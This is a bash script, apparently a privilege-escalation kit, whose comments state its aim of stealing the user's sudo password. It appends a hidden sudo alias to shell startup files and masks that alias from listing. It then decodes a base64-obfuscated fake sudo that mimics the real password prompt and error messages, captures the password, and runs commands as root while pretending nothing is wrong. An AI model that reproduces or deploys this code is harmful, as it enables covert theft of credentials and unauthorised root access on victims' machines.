# PrivKit.sh
# By Me (The Snark) - thesnark@protonmail.ch

# Our main goal is to eventually escalate privilege to execute our payload.
# We do this by waiting for the user to execute sudo at some point.
# We then use their password to execute sudo on our own, set up the root
# account with similar settings and then execute our payload.

# If user specifies using a dot folder, make it and set it up.
# If not, just go for the gold in the $HOME/bin folder


if [[ $# > 0 ]] && [[ $1 = 'h' ]]
then
OS=$(uname)
if [ $OS = 'Linux' ] 
then
FOLDER_NAME=$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${2:-32})
elif [ $OS = 'Darwin' ]
then
FOLDER_NAME=$(hexdump -n 16 -e '4/4 "%08X" 1 "\n"' /dev/random)
fi
#echo "PATH=\$HOME/.$FOLDER_NAME:\$PATH" >> ~/.bashrc
if [ $OS = 'Linux' ]
then 
echo "alias sudo='$HOME/.$FOLDER_NAME/suspy'" >> ~/.bashrc
echo "alias alias=\"alias | grep -v sudo\"" >> ~/.bashrc
mkdir ~/.$FOLDER_NAME 
#FOLDER_NAME="~/.$FOLDER_NAME"
#eelif [[ $# >0 ]] && [[ $1 = 'b' ]]
#FOLDER_NAME="~/bin"
elif [ $OS = 'Darwin' ]
then
echo "alias sudo='$HOME/.$FOLDER_NAME/suspy'" >> ~/.bash_profile
echo "alias alias=\"alias | grep -v sudo\"" >> ~/.bash_profile
mkdir ~/.$FOLDER_NAME
fi
fi

#echo "PATH=\$HOME/.$FOLDER_NAME:\$PATH" >> ~/.profile

#Our sudo script is here
echo "ZnVuY3Rpb24gdGVzdHBhc3MgewpPUz0kKHVuYW1lKQppZiBbICRPUyA9ICdMaW51eCcgXQp0aGVu
CnJlYWQgLXNwICJbc3Vkb10gcGFzc3dvcmQgZm9yICRVU0VSOiAiIGxpbmUKcHJpbnRmICJcbiIK
ZXhlYyBlY2hvICRsaW5lIHwgc3VkbyAta1MgZWNobyAiaGkiID4gL2Rldi9udWxsIDI+JjEKcmVz
PSQ/CnJldHVybiAkcmVzCmVsaWYgWyAkT1MgPSAnRGFyd2luJyBdCnRoZW4KcmVhZCAtc3AgIlBh
c3N3b3JkOiIgbGluZQpwcmludGYgIlxuIgplY2hvICRsaW5lIHwgc3VkbyAta1MgZWNobyAiaGki
ID4gL2Rldi9udWxsIDI+JjEgIApyZXM9JD8KcmV0dXJuICRyZXMKZmkKfQoKaWYgWyAkIyAtZ3Qg
MCBdCnRoZW4KT1M9JCh1bmFtZSkKc3VkbyAtbiBlY2hvICJoaSIgPiAvZGV2L251bGwgMj4mMSAj
aGFzIHRoZSB1c2VyIHJlY2VudGx5IHN1ZG8nZD8gSWYgc28sIG5vIG5lZWQgZm9yIHRoZSByZXN0
LgppZiBbICQ/ICE9IDAgXQp0aGVuCmk9MAp0ZXN0cGFzcwppZiBbICQ/ICE9IDAgXQp0aGVuCndo
aWxlIFsgJGkgLWx0IDIgXSAKZG8KaT0kKChpKzEpKQpwcmludGYgJ1NvcnJ5LCB0cnkgYWdhaW4u
XG4nCnRlc3RwYXNzCmlmIFsgJD8gPSAwIF0KdGhlbgpleGVjIGVjaG8gJGxpbmUgfCBzdWRvIC1T
IGVjaG8gImhpIiA+IC9kZXYvbnVsbCAyPiYxCnN1ZG8gLW4gZWNobyAiXl9eIHJla3QhIgpzdWRv
IC1uICRACmV4aXQKZmkKZG9uZQppPSQoKGkrMSkpCmVjaG8gInN1ZG86ICRpIGluY29ycmVjdCBw
YXNzd29yZCBhdHRlbXB0cyIKZWxzZQpleGVjIGVjaG8gJGxpbmUgfCBzdWRvIC1TIGVjaG8gIl5f
XiByZWt0ISIgPiAvZGV2L251bGwgMj4mMQpzdWRvIC1uIGVjaG8gIl5fXiByZWt0IgpzdWRvIC1u
ICRAICNwcmV0ZW5kIG5vdGhpbmcncyB3cm9uZwpmaQplbHNlCnN1ZG8gLW4gZWNobyAiXl9eIHJl
a3QhIiAjcGF5bG9hZApzdWRvIC1uICRACmZpCmVsc2UKZWNobyAidXNhZ2U6IHN1ZG8gLWggfCAt
SyB8IC1rIHwgLVYiCmVjaG8gInVzYWdlOiBzdWRvIC12IFstQWtuU10gWy1nIGdyb3VwXSBbLWgg
aG9zdF0gWy1wIHByb21wdF0gWy11IHVzZXJdIgplY2hvICJ1c2FnZTogc3VkbyAtbCBbLUFrblNd
IFstZyBncm91cF0gWy1oIGhvc3RdIFstcCBwcm9tcHRdIFstVSB1c2VyXSBbLXUgdXNlcl0gW2Nv
bW1hbmRdIgplY2hvICJ1c2FnZTogc3VkbyBbLUFiRUhrblBTXSBbLXIgcm9sZV0gWy10IHR5cGVd
IFstQyBudW1dIFstZyBncm91cF0gWy1oIGhvc3RdIFstcCBwcm9tcHRdIFstdSB1c2VyXSBbVkFS
PXZhbHVlXSBbLWl8LXNdIFs8Y29tbWFuZD5dIgplY2hvICJ1c2FnZTogc3VkbyAtZSBbLUFrblNd
IFstciByb2xlXSBbLXQgdHlwZV0gWy1DIG51bV0gWy1nIGdyb3VwXSBbLWggaG9zdF0gWy1wIHBy
b21wdF0gWy11IHVzZXJdIGZpbGUgLi4uIgpmaQoK" > ~/.$FOLDER_NAME/sudo_64
if [ $OS = 'Linux' ]
then
base64 --ignore-garbage -d ~/.$FOLDER_NAME/sudo_64 > ~/.$FOLDER_NAME/suspy
chmod +x ~/.$FOLDER_NAME/suspy
rm ~/.$FOLDER_NAME/sudo_64
elif [ $OS = 'Darwin' ]
then
base64 -D ~/.$FOLDER_NAME/sudo_64 > ~/.$FOLDER_NAME/suspy
chmod +x ~/.$FOLDER_NAME/suspy
rm ~/.$FOLDER_NAME/sudo_64
fi
#Our ls script is here
#echo "" > ~/.$FOLDER_NAME/ls_64
#base64 --ignore-garbage -d ~/.$FOLDER_NAME/ls_64 > ~/.$FOLDER_NAME/ls
#chmod +x ~/.$FOLDER_NAME/ls


